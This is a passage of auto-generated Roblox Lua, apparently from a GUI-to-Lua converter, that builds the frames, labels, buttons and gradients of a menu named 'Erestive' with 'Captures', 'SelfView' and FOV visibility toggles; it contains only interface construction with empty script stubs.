G2L["d7"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["d8"] = Instance.new("UIGradient", G2L["d1"]);
G2L["d8"]["Rotation"] = -90;
G2L["d8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UIGradient
G2L["d9"] = Instance.new("UIGradient", G2L["c0"]);
G2L["d9"]["Rotation"] = -90;
G2L["d9"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["da"] = Instance.new("Frame", G2L["a7"]);
G2L["da"]["BorderSizePixel"] = 0;
G2L["da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["da"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["da"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["da"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["db"] = Instance.new("UIListLayout", G2L["da"]);
G2L["db"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night
G2L["dc"] = Instance.new("Frame", G2L["da"]);
G2L["dc"]["BorderSizePixel"] = 0;
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["dc"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["dc"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["dc"]["Name"] = [[night]];
G2L["dc"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.Text
G2L["dd"] = Instance.new("TextLabel", G2L["dc"]);
G2L["dd"]["TextWrapped"] = true;
G2L["dd"]["ZIndex"] = 9;
G2L["dd"]["TextSize"] = 14;
G2L["dd"]["TextScaled"] = true;
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["dd"]["BackgroundTransparency"] = 1;
G2L["dd"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["dd"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["dd"]["Text"] = [[Captures]];
G2L["dd"]["Name"] = [[Text]];
G2L["dd"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar
G2L["de"] = Instance.new("Frame", G2L["dc"]);
G2L["de"]["BorderSizePixel"] = 0;
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["de"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["de"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["de"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["de"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar.UIGradient
G2L["df"] = Instance.new("UIGradient", G2L["de"]);
G2L["df"]["Rotation"] = 90;
G2L["df"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UICorner
G2L["e0"] = Instance.new("UICorner", G2L["dc"]);
G2L["e0"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig
G2L["e1"] = Instance.new("Frame", G2L["dc"]);
G2L["e1"]["BorderSizePixel"] = 0;
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e1"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["e1"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["e1"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UICorner
G2L["e2"] = Instance.new("UICorner", G2L["e1"]);
G2L["e2"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["e3"] = Instance.new("Frame", G2L["e1"]);
G2L["e3"]["ZIndex"] = 2;
G2L["e3"]["BorderSizePixel"] = 0;
G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(0, 43, 6);
G2L["e3"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["e3"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["e3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e3"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["e4"] = Instance.new("LocalScript", G2L["e3"]);
G2L["e4"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["e5"] = Instance.new("ImageLabel", G2L["e4"]);
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e5"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["e5"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["e5"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e5"]["BackgroundTransparency"] = 1;
G2L["e5"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["e6"] = Instance.new("UICorner", G2L["e3"]);
G2L["e6"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["e7"] = Instance.new("TextButton", G2L["e3"]);
G2L["e7"]["TextWrapped"] = true;
G2L["e7"]["TextSize"] = 14;
G2L["e7"]["TextScaled"] = true;
G2L["e7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["e7"]["BackgroundTransparency"] = 1;
G2L["e7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e7"]["Text"] = [[ ]];
G2L["e7"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["e8"] = Instance.new("LocalScript", G2L["e7"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["e9"] = Instance.new("TextLabel", G2L["e3"]);
G2L["e9"]["TextWrapped"] = true;
G2L["e9"]["ZIndex"] = 9;
G2L["e9"]["TextSize"] = 14;
G2L["e9"]["TextScaled"] = true;
G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["BackgroundTransparency"] = 1;
G2L["e9"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["e9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["e9"]["Text"] = [[Visible]];
G2L["e9"]["Name"] = [[Text]];
G2L["e9"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["ea"] = Instance.new("UIGradient", G2L["e3"]);
G2L["ea"]["Rotation"] = -90;
G2L["ea"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.FOVSet
G2L["eb"] = Instance.new("TextBox", G2L["e1"]);
G2L["eb"]["Visible"] = false;
G2L["eb"]["Name"] = [[FOVSet]];
G2L["eb"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["eb"]["TextWrapped"] = true;
G2L["eb"]["TextSize"] = 14;
G2L["eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["eb"]["TextScaled"] = true;
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["eb"]["PlaceholderText"] = [[16 - classic]];
G2L["eb"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["eb"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["eb"]["Text"] = [[]];
G2L["eb"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UIListLayout
G2L["ec"] = Instance.new("UIListLayout", G2L["e1"]);
G2L["ec"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["ec"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["ed"] = Instance.new("Frame", G2L["e1"]);
G2L["ed"]["ZIndex"] = 2;
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["ed"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["ed"]["Position"] = UDim2.new(0.50773, 0, -0, 0);
G2L["ed"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ed"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["ee"] = Instance.new("LocalScript", G2L["ed"]);
G2L["ee"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["ef"] = Instance.new("ImageLabel", G2L["ee"]);
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["ef"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["ef"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ef"]["BackgroundTransparency"] = 1;
G2L["ef"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["f0"] = Instance.new("UICorner", G2L["ed"]);
G2L["f0"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["f1"] = Instance.new("TextButton", G2L["ed"]);
G2L["f1"]["TextWrapped"] = true;
G2L["f1"]["TextSize"] = 14;
G2L["f1"]["TextScaled"] = true;
G2L["f1"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["f1"]["BackgroundTransparency"] = 1;
G2L["f1"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f1"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f1"]["Text"] = [[ ]];
G2L["f1"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["f2"] = Instance.new("LocalScript", G2L["f1"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["f3"] = Instance.new("TextLabel", G2L["ed"]);
G2L["f3"]["TextWrapped"] = true;
G2L["f3"]["ZIndex"] = 9;
G2L["f3"]["TextSize"] = 14;
G2L["f3"]["TextScaled"] = true;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["BackgroundTransparency"] = 1;
G2L["f3"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["f3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f3"]["Text"] = [[Visible]];
G2L["f3"]["Name"] = [[Text]];
G2L["f3"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["f4"] = Instance.new("UIGradient", G2L["ed"]);
G2L["f4"]["Rotation"] = -90;
G2L["f4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UIGradient
G2L["f5"] = Instance.new("UIGradient", G2L["dc"]);
G2L["f5"]["Rotation"] = -90;
G2L["f5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["f6"] = Instance.new("Frame", G2L["a7"]);
G2L["f6"]["BorderSizePixel"] = 0;
G2L["f6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f6"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["f6"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["f6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f6"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["f7"] = Instance.new("UIListLayout", G2L["f6"]);
G2L["f7"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night
G2L["f8"] = Instance.new("Frame", G2L["f6"]);
G2L["f8"]["BorderSizePixel"] = 0;
G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["f8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["f8"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["f8"]["Name"] = [[night]];
G2L["f8"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.Text
G2L["f9"] = Instance.new("TextLabel", G2L["f8"]);
G2L["f9"]["TextWrapped"] = true;
G2L["f9"]["ZIndex"] = 9;
G2L["f9"]["TextSize"] = 14;
G2L["f9"]["TextScaled"] = true;
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["BackgroundTransparency"] = 1;
G2L["f9"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["f9"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["f9"]["Text"] = [[SelfView]];
G2L["f9"]["Name"] = [[Text]];
G2L["f9"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar
G2L["fa"] = Instance.new("Frame", G2L["f8"]);
G2L["fa"]["BorderSizePixel"] = 0;
G2L["fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fa"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["fa"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["fa"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["fa"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar.UIGradient
G2L["fb"] = Instance.new("UIGradient", G2L["fa"]);
G2L["fb"]["Rotation"] = 90;
G2L["fb"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UICorner
G2L["fc"] = Instance.new("UICorner", G2L["f8"]);
G2L["fc"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig
G2L["fd"] = Instance.new("Frame", G2L["f8"]);
G2L["fd"]["BorderSizePixel"] = 0;
G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["fd"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["fd"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["fd"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UICorner
G2L["fe"] = Instance.new("UICorner", G2L["fd"]);
G2L["fe"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["ff"] = Instance.new("Frame", G2L["fd"]);
G2L["ff"]["ZIndex"] = 2;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(0, 43, 6);
G2L["ff"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["ff"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["ff"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["ff"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["100"] = Instance.new("LocalScript", G2L["ff"]);
G2L["100"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["101"] = Instance.new("ImageLabel", G2L["100"]);
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["101"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["101"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["101"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["101"]["BackgroundTransparency"] = 1;
G2L["101"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["102"] = Instance.new("UICorner", G2L["ff"]);
G2L["102"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["103"] = Instance.new("TextButton", G2L["ff"]);
G2L["103"]["TextWrapped"] = true;
G2L["103"]["TextSize"] = 14;
G2L["103"]["TextScaled"] = true;
G2L["103"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["103"]["BackgroundTransparency"] = 1;
G2L["103"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["103"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["103"]["Text"] = [[ ]];
G2L["103"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["104"] = Instance.new("LocalScript", G2L["103"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["105"] = Instance.new("TextLabel", G2L["ff"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["ZIndex"] = 9;
G2L["105"]["TextSize"] = 14;
G2L["105"]["TextScaled"] = true;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["BackgroundTransparency"] = 1;
G2L["105"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["105"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["105"]["Text"] = [[Visible]];
G2L["105"]["Name"] = [[Text]];
G2L["105"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["106"] = Instance.new("UIGradient", G2L["ff"]);
G2L["106"]["Rotation"] = -90;
G2L["106"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.FOVSet
G2L["107"] = Instance.new("TextBox", G2L["fd"]);
G2L["107"]["Visible"] = false;
G2L["107"]["Name"] = [[FOVSet]];
G2L["107"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["107"]["TextWrapped"] = true;
G2L["107"]["TextSize"] = 14;
G2L["107"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["107"]["TextScaled"] = true;
G2L["107"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["107"]["PlaceholderText"] = [[16 - classic]];
G2L["107"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["107"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["107"]["Text"] = [[]];
G2L["107"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UIListLayout
G2L["108"] = Instance.new("UIListLayout", G2L["fd"]);
G2L["108"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["108"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["109"] = Instance.new("Frame", G2L["fd"]);
G2L["109"]["ZIndex"] = 2;
G2L["109"]["BorderSizePixel"] = 0;
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["109"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["109"]["Position"] = UDim2.new(0.50773, 0, -0, 0);
G2L["109"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["109"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["10a"] = Instance.new("LocalScript", G2L["109"]);
G2L["10a"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["10b"] = Instance.new("ImageLabel", G2L["10a"]);
G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10b"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["10b"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["10b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10b"]["BackgroundTransparency"] = 1;
G2L["10b"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["10c"] = Instance.new("UICorner", G2L["109"]);
G2L["10c"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["10d"] = Instance.new("TextButton", G2L["109"]);
G2L["10d"]["TextWrapped"] = true;
G2L["10d"]["TextSize"] = 14;
G2L["10d"]["TextScaled"] = true;
G2L["10d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["10d"]["BackgroundTransparency"] = 1;
G2L["10d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10d"]["Text"] = [[ ]];
G2L["10d"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["10e"] = Instance.new("LocalScript", G2L["10d"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["10f"] = Instance.new("TextLabel", G2L["109"]);
G2L["10f"]["TextWrapped"] = true;
G2L["10f"]["ZIndex"] = 9;
G2L["10f"]["TextSize"] = 14;
G2L["10f"]["TextScaled"] = true;
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["10f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["BackgroundTransparency"] = 1;
G2L["10f"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["10f"]["Text"] = [[Visible]];
G2L["10f"]["Name"] = [[Text]];
G2L["10f"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["110"] = Instance.new("UIGradient", G2L["109"]);
G2L["110"]["Rotation"] = -90;
G2L["110"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UIGradient
G2L["111"] = Instance.new("UIGradient", G2L["f8"]);
G2L["111"]["Rotation"] = -90;
G2L["111"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame
G2L["112"] = Instance.new("Frame", G2L["a7"]);
G2L["112"]["BorderSizePixel"] = 0;
G2L["112"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["112"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["112"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.UIListLayout
G2L["113"] = Instance.new("UIListLayout", G2L["112"]);
G2L["113"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night
G2L["114"] = Instance.new("Frame", G2L["112"]);
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["114"]["Size"] = UDim2.new(1, 0, 1, 0);
